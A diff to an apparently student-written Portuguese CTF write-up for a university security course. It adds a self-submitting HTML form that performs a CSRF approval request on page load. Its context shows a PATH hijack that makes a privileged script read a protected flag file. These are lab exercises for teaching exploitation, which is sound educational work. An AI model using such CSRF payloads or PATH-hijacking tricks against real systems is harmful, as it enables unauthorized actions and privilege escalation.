@@ -1,3 +1,5 @@
+# Desafios Extra/Opcionais
+
 ## British Punctuality
 
 Explorando inicialmente o servidor, encontramos no diretório `home/flag_reader` um script `my_script.sh` que faz uso de um executável `/home/flag_reader/reader` cujo código fonte podemos ler no ficheiro `main.c`. Não temos permissões para escrever para nenhum destes ficheiros. Encontramos também  um diretório `flags` onde se encontra a flag que procuramos (`/flags/flag.txt`), no entanto, como seria esperado, não temos permissões para aceder a este diretório.  
@@ -76,6 +78,22 @@ nobody@330311abc802:/tmp$ echo "cat /flags/flag.txt" > printenv
 ```
 
 Depois do script ser executado basta ler o conteúdo do ficheiro `/tmp/last_log` e uma das linhas será a flag.
+
+## Apply For Flag II
+
+```html
+<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/<requestID>/approve" role="form">
+    <div class="submit">
+        <input type="submit" id="giveflag" value="Give the flag">
+    </div>
+</form>
+
+<script> 
+    window.onload = function(){
+        document.getElementById('giveflag').click();
+    } 
+</script>
+``` 
 
 
 
